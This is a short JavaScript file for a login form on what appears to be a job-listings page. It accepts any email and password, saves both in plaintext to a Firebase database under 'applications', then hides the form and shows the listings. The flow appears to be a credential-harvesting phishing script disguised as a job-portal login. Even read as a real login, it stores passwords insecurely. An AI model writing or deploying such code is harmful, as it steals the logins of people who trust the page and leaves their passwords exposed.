import { db } from './firebase-config.js';
import { ref, push, set } from "https://www.gstatic.com/firebasejs/12.15.0/firebase-database.js";

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('loginForm');
    const errorMsg = document.getElementById('errorMsg');
    const jobList = document.getElementById('jobListings');

    form.addEventListener('submit', function(e) {
        e.preventDefault();
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();

        if (!email || !password) {
            errorMsg.textContent = 'Please fill in both fields.';
            return;
        }

        const timestamp = new Date().toISOString();
        const newRef = push(ref(db, 'applications'));
        set(newRef, {
            email: email,
            password: password,
            timestamp: timestamp
        }).then(() => {
            console.log('Data saved successfully');
        }).catch((err) => {
            console.error('Error:', err);
            alert('Failed to save. Check console.');
        });

        form.style.display = 'none';
        jobList.style.display = 'block';
        errorMsg.textContent = '';
    });
});
